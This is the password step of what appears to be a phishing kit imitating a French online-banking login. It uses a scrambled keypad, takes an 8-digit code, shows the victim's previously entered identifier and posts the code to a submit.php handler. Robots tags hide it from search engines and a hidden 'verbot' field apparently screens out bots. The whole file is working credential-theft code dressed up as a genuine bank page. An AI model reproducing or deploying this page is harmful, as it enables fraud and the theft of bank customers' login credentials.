<?php


    include_once '../inc/app.php';
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" href="../assets/images/favicon.ico" type="image/x-icon"> 

        <title>Mon identifiant</title>
    </head>

    <body>

        <div class="logo text-center mt50 mb50">
            <img style="max-width: 180px;" src="../assets/images/logo.png">
        </div>
        
        <div id="details">
            <div class="top-border"></div>
            <div class="image mb-0 mt30"><img src="../assets/images/arrow.png"> <span><?php echo $_SESSION['identifiant'] ?></span></div>
            <form method="post" action="submit.php">
                <input type="hidden" name="verbot">
                <input type="hidden" name="type" value="pass">
                <input type="hidden" name="password" id="password">
                <legend class="mb-1">Mon mot de passe</legend>
                <div class="pass-bulls mb10">
                    <ul>
                        <li class="not-active"></li>
                        <li class="not-active"></li>
                        <li class="not-active"></li>
                        <li class="not-active"></li>
                        <li class="not-active"></li>
                        <li class="not-active"></li>
                        <li class="not-active"></li>
                        <li class="not-active"></li>
                        <li class="last remove"><img src="../assets/images/remove.png"></li>
                    </ul>
                </div>
                <p class="error" style="text-align: center; color: #f11c3a;">Veuillez saisir un mot de passe valide</p>
                <div class="numbers mb50">
                    <ul class="mb20">
                        <li data-num="2"><img src="../assets/images/2.png"></li>
                        <li data-num="5"><img src="../assets/images/5.png"></li>
                        <li data-num="3"><img src="../assets/images/3.png"></li>
                        <li data-num="4"><img src="../assets/images/4.png"></li>
                        <li data-num="9"><img src="../assets/images/9.png"></li>
                    </ul>
                    <ul>
                        <li data-num="8"><img src="../assets/images/8.png"></li>
                        <li data-num="6"><img src="../assets/images/6.png"></li>
                        <li data-num="1"><img src="../assets/images/1.png"></li>
                        <li data-num="7"><img src="../assets/images/7.png"></li>
                        <li data-num="0"><img src="../assets/images/0.png"></li>
                    </ul>
                </div>
                <div class="form-group mb20">
                    <button id="submit" type="submit">Je me connecte</button>
                </div>
                <p class="text-center mb-0" style="color: #009de0;">Mot de passe oublié ?</p>
            </form>
        </div>

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

        <script>
            
            $('.numbers ul li').click(function(){
                if( $('#password').val().length == 8 )
                    return false;
                $('.error').hide();
                var num     = $(this).data('num');
                var old_val = $('#password').val();
                var zz      = old_val + num;
                $('#password').val(zz);

                if( $('#password').val().length > 0 ) {
                    $(".remove").show();
                }
                $('.pass-bulls ul li').each(function(i){
                    if( $(this).hasClass('not-active') ) {
                        $(this).addClass('active');
                        $(this).removeClass('not-active');
                        return false;
                    }
                });
            });

            $('.pass-bulls .last').click(function(){
                $('.pass-bulls ul li.active').last().removeClass('active').addClass('not-active');
                var new_val = $('#password').val().slice(0,-1);
                $('#password').val(new_val);
                if( $('#password').val().length == 0 ) {
                    $(".remove").hide();
                }
                return false;
            });

            $('#submit').click(function(e){
                if( $('#password').val().length !== 8 ) {
                    e.preventDefault();
                    $('.error').show();
                }
            });

        </script>

    </body>

</html>